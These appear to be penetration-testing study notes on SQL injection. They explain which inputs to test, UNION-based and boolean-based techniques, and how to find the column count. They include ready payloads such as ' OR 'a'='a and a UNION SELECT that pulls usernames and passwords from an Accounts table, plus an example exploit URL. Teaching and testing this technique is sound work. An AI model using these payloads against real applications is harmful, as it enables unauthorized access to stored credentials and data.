## SQL

It's a **backend database** to store the data they process

### SQL Injections

SQL Injection(SQLi) attacks allow an unathorized user to **take control over SQL statements** used by a web application

To find SQL injections, we need to check any user input (every input must be tested to conduct a professional pentest):

+ GET parameters
+ POST parameters
+ HTTP Headers
  + User-Agent
  + Cookie
  + Accept

Tests can be:

+ String terminators:` ' and ''`
+ SQL commands: `SELECT, UNION and others`
+ SQL comments: `# or --`


### SQL STATEMENTS

```SQL

SELECT columns1,columns2 FROM table1 WHERE file;
 
SELECT name,description FROM products WHERE ID=9;

```

### UNION example

```SQL
SELECT Name, Description FROM Products WHERE ID='9' UNION SELECT Username,Passwword FROM Accounts;
```

Can also perform a UNION with some *chosen data*

```SQL
SELECT Name, Description FROM Products WHERE ID='9' UNION SELECT 'Example','Data';
```
### VULNERABLE DYNAMIC QUERIES

```SQL
-- This dynamic query expects $id values as a string:
SELECT Name, Description FROM Products WHERE ID='$id'

-- But what if an attacker crafts a $id value which can change the query to something like ' OR 'a'='a 
-- then the query becomes:
SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';
-- ...which tells the database to select the items by checking two conditions which is always true.

-- An attacker could also exploit the UNION command by supplying the following:
-- ' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a;
-- Thus it changes the original query to:

SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
```

### Boolean Based SQLi

Once penentration testers find a way to tell when a condition is true or false, they can ask the database some simple True/False questions:

+ Is the first letter of the username 'a'?
+ Does this database contain three tables?
+ ...

We can use two MySQL functions: `user()` and `substring()`

+ `user()` returns the name of the user currently using the database:
```SQL
select user();
```
+ `substring()` returns a substring of the given argument. It takes 3 parameters:
  + the input string
  + the position of the substring
  + its length
```SQL
select substring('elarnsecurity', 2, 1)
select substring(user(), 1, 1)
```


### UNION BASED SQL Injections

The following payload forces the web application to display the result of the *user()* function on the **output page**:

```sql
' UNION SELECT user(); -- -
```
The query will be like this:
```sql
SELECT Descripion FROM items WHERE id='' UNION SELECT user(); -- -';
```

+ To exploit a SQL injection you first need to know how many fields the vulnerable query selects, you do this by trial and error
+ We know there's an injection by ` ' UNION SELECT null; -- -`, this should display:

`Warning: mysql_fetch_array() expects parameter 1 to be mysql_result, boolean given in /var/www/view.php on line 32`

+ We can try with two fields: `' UNION SELECT null null; -- - ` and three even to confirm that the original query only has two fields
+ Once we know how many fields are in the query it's time to test which fields are part of the output page
+ You can do that by injecting some known values and checking thee results in the output page, as in: `' UNION SELECT 'elsid1', 'elsid2'; -- -`
+ Now we can exploit the injection: 
```
http://victim.site/view.php?id=' UNION SELECT user(), 'elsid2'; -- -`
```
